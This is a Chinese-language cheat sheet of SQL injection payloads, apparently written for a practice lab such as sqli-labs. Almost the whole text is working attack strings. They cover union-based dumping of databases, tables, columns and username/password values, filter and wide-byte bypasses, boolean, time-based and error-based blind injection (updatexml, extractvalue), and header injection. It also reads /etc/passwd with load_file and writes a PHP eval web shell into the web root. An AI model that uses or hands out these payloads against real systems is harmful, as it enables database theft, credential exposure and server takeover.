# SQL注入payload总结

首先尝试字符 ' " ') ')) ") ")) ,先让页面出现错误，说明可能存在注入，然后再结合 and 1=1 --+让页面显示成功  之后判断确定的闭合方式  (有回显)

?id=1'
?id=1') --+ 判断闭合方式
?id=1") --+
?id=1' and 1=1 --+
?id=1' or 1=1 --+

过滤了空格和and or 
?id=1'%a0||'1 
?id=0'union%a0select%a01,database(),3%26%26'1'='1 
宽字节绕过，注释掉转义字符
?id=-1%E6' union select 1,version(),database() --+


过滤了注释符
?id=1' and 1='1  
?id=' or '1'='1
?id=' union select 1,database(),3 or '1'='1 爆库payload
?id=' union select 1,2,database() '  爆库payload
?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '    爆表payload
?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' or '1'= '     爆列名payload
?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '     爆值payload


?id=1' oder by 3（字段数）--+   测试字段数
?id=-1' union select 1,2,3 --+  
?id=-1' union select 1,database(),3 --+  爆出数据库名
?id=-1' union select 1,database(),user() --+ 爆出库名和当前用户
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 爆出当前数据库下的表名
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+    爆出字段名
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+  获取表中的数据


?id=1' and sleep(3) --+ 延时注入
?id=1' and if(length(database())=8,sleep(5),1)--+ 时间盲注判断数据库名长度
?id=1' and if(left(database(),1)='s' , sleep(3), 1) --+ 时间盲注爆库
时间盲注爆出数据 就是再bool盲注基础上加上and if (  bool注入payload ,sleep(3),1)

?id=1' and length(database())=8 --+  盲注判断数据库名长度
?id=1' and left((select database()),1)='s'--+ 爆库payload
?id=1' and left((select database()),8)='security'--+ 爆库payload
?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' --+ 爆表payload
?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' --+ 爆列名payload
?id=1' and left((select password from users order by id limit 0,1),1)='d' --+ 爆字段值

?id=-1' union select count(*),count(*), concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+ 报错注入
?id=-1' union select count(*),1, concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
?id=-1' union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))as a from information_schema.tables group by a --+

 ' and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 更新报错注入爆库
 ' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+  爆表名
 ' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1) --+ 爆字段
 ' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1) --+ 爆出数据

HTTP 头部  User-Agent:    Referer:
 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and'   爆表名
 'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and'   爆字段
 'and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users),0x7e)) and '  爆出数据


?id=-1' union select 1,load_file("/etc/passwd"),3 --+ 读取文件
?id=-1')) union select 1,2,'<?php @eval($_POST["flamingo"]);?>' into outfile "/var/www/html/yijian.php" --+ 上传文件
